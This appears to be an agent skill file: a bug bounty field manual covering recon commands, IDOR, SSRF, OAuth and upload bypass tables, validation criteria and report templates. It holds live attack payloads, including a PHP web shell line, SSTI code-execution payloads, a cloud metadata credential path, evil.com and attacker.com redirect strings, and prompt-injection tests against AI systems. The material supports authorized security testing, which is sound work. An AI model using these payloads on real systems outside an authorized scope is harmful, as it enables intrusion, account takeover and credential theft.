---
name: field-manual
description: End-to-end bug bounty hunt loop. Covers recon, hunting, validation, reporting for web/API/AI/contract targets. Use for full mission context.
---

# FIELD MANUAL

Use the canonical loop in `../../manual/workflow.md`: `boundary` → `survey` → `probe` → `screen` → `gate` → `pivot` → `brief`. For narrower tasks, use the specific track instead.

---

## HARD RULES

1. Read full scope first — verify every asset is target-owned
2. No theoretical bugs — "Can attacker steal funds/PII/ATO/RCE RIGHT NOW?" If no, STOP
3. 7-Question Gate before ANY report (see VALIDATE section)
4. One bug class at a time — go deep, don't spray
5. 5-MINUTE RULE — target shows nothing after 5 min probing? MOVE ON
6. 1-HOUR RULE — stuck with no progress? SWITCH target
7. Verify data isn't already public — check web UI incognito before reporting API "leaks"

### Kill Immediately

| Pattern | Why |
|---|---|
| "Could theoretically allow..." | Not exploitable |
| "Attacker with X, Y, Z conditions..." | Too many preconditions |
| Dead code with bug | Not reachable |
| SSRF with DNS-only callback | Need data exfil |
| Open redirect alone | Need ATO/OAuth chain |
| Source maps without secrets | No impact |

---

## A→B CHAIN HUNTING

Single bugs pay. Chains pay 3-10x.

| Bug A (Signal) | Hunt for B | Escalate to C |
|---|---|---|
| IDOR read | PUT/DELETE same endpoint | Full data manipulation |
| SSRF any | Cloud metadata 169.254.169.254 | IAM cred exfil → RCE |
| XSS stored | HttpOnly on session cookie? | Session hijack → ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft → ATO |
| S3 listing | JS bundles → grep secrets | OAuth chain |
| Rate limit bypass | OTP brute force | ATO |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| CORS reflects origin | Test credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO |

**Protocol:** Confirm A → Map siblings → Test siblings → Chain A+B → Quantify → Report

---

## TOOLS

| Tool | Purpose |
|---|---|
| subfinder, assetfinder | Subdomain enum |
| httpx | Probe live hosts |
| nuclei | Template scanner |
| katana | Crawl |
| waybackurls, gau | Archive URLs |
| ffuf | Fuzzer (always use `-ac`) |
| dalfox | XSS |
| gf | Grep patterns |
| interactsh-client | OOB callbacks |
| arjun | Hidden param discovery |
| kiterunner | API endpoint brute |
| trufflehog, gitleaks | Secret scanning |
| semgrep | Static analysis |

---

## PHASE 1: RECON

```bash
# Subdomains
subfinder -d TARGET -silent | anew /tmp/subs.txt
assetfinder --subs-only TARGET | anew /tmp/subs.txt

# Resolve + live
cat /tmp/subs.txt | dnsx -silent | httpx -silent -status-code -title -tech-detect -o /tmp/live.txt

# URLs
cat /tmp/live.txt | awk '{print $1}' | katana -d 3 -silent | anew /tmp/urls.txt
echo TARGET | waybackurls | anew /tmp/urls.txt

# Scan
nuclei -l /tmp/live.txt -severity critical,high,medium -silent -o /tmp/nuclei.txt
```

### Quick Wins
`/.git/config` | `/.env` | `/graphql` | `/actuator/env` | `/swagger-ui.html` | Firebase `.json` | S3 buckets | Default creds | CORS `Origin: https://evil.com`

### Tech Fingerprints

| Signal | Tech |
|---|---|
| `XSRF-TOKEN` + `*_session` | Laravel |
| `X-Powered-By: Express` | Node/Express |
| `wp-json`/`wp-content` | WordPress |
| `X-Powered-By: Next.js` / `__next` | Next.js |
| `{"errors":[{"message":` | GraphQL |

### Framework Paths
- **Laravel**: `/horizon` `/telescope` `/.env` `/storage/logs/laravel.log`
- **WordPress**: `/wp-json/wp/v2/users` `/xmlrpc.php`
- **Spring**: `/actuator/env` `/actuator/heapdump`

### Source Code Grep
```bash
# JS/TS dangerous sinks
grep -rn "eval(\|innerHTML\|dangerouslySetInner\|execSync" --include="*.ts" --include="*.js" | grep -v node_modules
# Python
grep -rn "pickle\.loads\|yaml\.load\|eval(\|subprocess\|os\.system" --include="*.py" | grep -v test
# PHP
grep -rn "unserialize\|eval(\|==.*password\|==.*token" --include="*.php"
# Rust (network-facing panics)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|serialize"
# TODOs near auth
grep -rn "TODO\|FIXME\|HACK\|UNSAFE" --include="*.ts" --include="*.js" | grep -iv "test\|spec"
```

---

## PHASE 2: LEARN

1. Read 3+ disclosed reports for the program
2. "What Changed" method: find fix commit → read diff → grep target for same anti-pattern
3. New features (< 30 days) = lowest security maturity
4. Mobile API often uses older/different API version

### Key Patterns
1. Feature complexity = bug surface
2. Developer inconsistency = strongest signal (`timingSafeEqual` in one place, `===` elsewhere)
3. "Else branch" bugs — validation skipped in fallback path
4. Import-from-URL → SSRF
5. Legacy endpoints lack auth that newer versions have
6. Check-then-deduct as two DB ops = race/double-spend

---

## PHASE 3: HUNT

### IDOR (10 Variants)

| # | Variant | Test |
|---|---|---|
| 1 | Direct | Change ID in URL `/api/users/123` → `456` |
| 2 | Body param | Change ID in POST body |
| 3 | GraphQL node | `{ node(id: "base64(Type:ID)") { ... } }` |
| 4 | Batch | `/api/users?ids=1,2,3,4,5` |
| 5 | Nested | Change parent ID `/orgs/{org}/users/{id}` |
| 6 | File path | `?path=../other-user/file.pdf` |
| 7 | Predictable | Sequential ints, timestamps, short UUIDs |
| 8 | Method swap | GET→403? Try PUT/PATCH/DELETE |
| 9 | Version rollback | v2 blocked → try `/api/v1/` |
| 10 | Header | `X-User-ID: victim_id` |

### SSRF IP Bypass

| Bypass | Payload |
|---|---|
| Decimal | `http://2130706433/` |
| Hex | `http://0x7f000001/` |
| Short | `http://127.1/` |
| IPv6 | `http://[::1]/` |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` |
| Redirect | `http://attacker.com/302→169.254.169.254` |
| DNS rebinding | Domain resolving to 127.0.0.1 |
| Protocol | `gopher://127.0.0.1:6379/_INFO` |

Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### OAuth / Redirect Bypass

| Bypass | Payload |
|---|---|
| Double encode | `%252F%252F` |
| Backslash | `https://target.com\@evil.com` |
| @-trick | `https://target.com@evil.com` |
| Protocol-relative | `//evil.com` |
| Null byte | `https://evil.com%00target.com` |
| Param pollution | `?next=target.com&next=evil.com` |

### File Upload Bypass

| Bypass | Technique |
|---|---|
| Double ext | `file.php.jpg` |
| Alt ext | `.phtml` `.phar` `.shtml` |
| Content-Type spoof | `image/jpeg` + PHP body |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Zip slip | `../../etc/cron.d/shell` in archive |

### SSTI Detection

| Payload | Engine |
|---|---|
| `{{7*7}}` → 49 | Jinja2/Twig |
| `${7*7}` → 49 | Freemarker |
| `<%= 7*7 %>` → 49 | ERB |
| `{{7*'7'}}` → 7777777 | Jinja2 (Twig=49) |

RCE: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | Twig `{{["id"]|filter("system")}}` | ERB `<%= \`id\` %>`

### GraphQL
```graphql
# Introspection
{__schema{types{name fields{name type{name}}}}}
# Batching (rate limit bypass)
[{"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"}]
# Alias IDOR
{ a:user(id:1){email} b:user(id:2){email} }
```

### LLM/AI (OWASP ASI)

| ID | Class | Test |
|---|---|---|
| ASI01 | Prompt injection | Override system prompt via user input |
| ASI02 | Tool misuse | Attacker-controlled params → SSRF/RCE |
| ASI04 | Priv esc | AI accesses admin-only tools |
| ASI05 | Indirect injection | Poison doc/URL the AI fetches |
| ASI08 | Insecure output | AI generates XSS/SQLi in rendered output |

Rule: ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO.

### Other Classes (Brief)
- **Race**: Coupon redemption, fund transfer, OTP brute — `seq 20 | xargs -P20` or Turbo Intruder single-packet
- **Business logic**: Negative quantities, price tampering, workflow skip, role escalation at registration
- **Cache poisoning**: Unkeyed headers (`X-Forwarded-Host`), web cache deception (`/account/settings.css`)
- **HTTP smuggling**: CL.TE, TE.CL, H2.CL — use Burp "HTTP Request Smuggler"
- **Subdomain takeover**: Dangling CNAMEs → escalate via cookies `domain=.target.com` or OAuth redirect
- **CI/CD**: `pull_request_target` + checkout, secrets in logs, build injection via branch names

### ATO Paths
1. Password reset: `Host: attacker.com` on `/forgot-password`
2. Reset token in Referer leak
3. Weak/predictable tokens (< 16 hex chars)
4. Token doesn't expire / reusable after 2nd issued
5. Email change without re-auth
6. OAuth account linking abuse
7. Session fixation (no rotation after login)

---

## PHASE 4: VALIDATE

### 7-Question Gate (all YES or KILL)

1. Can I exploit this RIGHT NOW with a working PoC?
2. Does it affect a user who took NO unusual actions?
3. Is impact concrete (money, PII, ATO, RCE)?
4. In scope per program policy?
5. Checked Hacktivity/changelog for duplicates?
6. NOT on the "always rejected" list?
7. Would a tired triager say "yes, real bug"?

### Always Rejected
Missing security headers · missing SPF/DKIM/DMARC · introspection alone · version disclosure without exploit · clickjacking on non-sensitive pages · tabnabbing · CSV injection · CORS wildcard without cred exfil · logout CSRF · self-XSS · open redirect alone · SSRF DNS-only · host header injection alone · no rate limit on non-critical forms · session not invalidated on logout · concurrent sessions · internal IP disclosure · mixed content · weak ciphers · missing cookie flags alone

### Chain-Required

| Low Finding | + Chain | = Valid |
|---|---|---|
| Open redirect | OAuth code theft | ATO |
| CORS wildcard | Credentialed exfil | Data theft |
| Self-XSS | Login CSRF | Stored XSS on victim |
| SSRF DNS-only | Internal access proof | Network access |
| Host header injection | Password reset poisoning | ATO |

### CVSS Quick Ref

| Bug | Score | Severity |
|---|---|---|
| IDOR read PII | 6.5 | Medium |
| IDOR write/delete | 7.5 | High |
| Auth bypass → admin | 9.8 | Critical |
| Stored XSS | 5.4-8.8 | Med-High |
| SQLi data exfil | 8.6 | High |
| SSRF cloud metadata | 9.1 | Critical |
| JWT none alg | 9.1 | Critical |

---

## PHASE 5: REPORT

### Title Formula
`[Bug Class] in [endpoint] allows [actor] to [impact] [scope]`

### Template
```
## Summary
[2-3 sentences: what, where, what attacker can do]

## Steps To Reproduce
1. [exact HTTP request]
2. [observe response]
3. [confirm impact]

## Impact
Attacker can [action] resulting in [harm]. Affects [N users/records].

## Severity
CVSS 3.1: X.X (Label)
```

### Pre-Submit
- [ ] Title follows formula
- [ ] Copy-pasteable HTTP request in steps
- [ ] Two accounts used (attacker + victim)
- [ ] CVSS matches described impact
- [ ] Report < 600 words
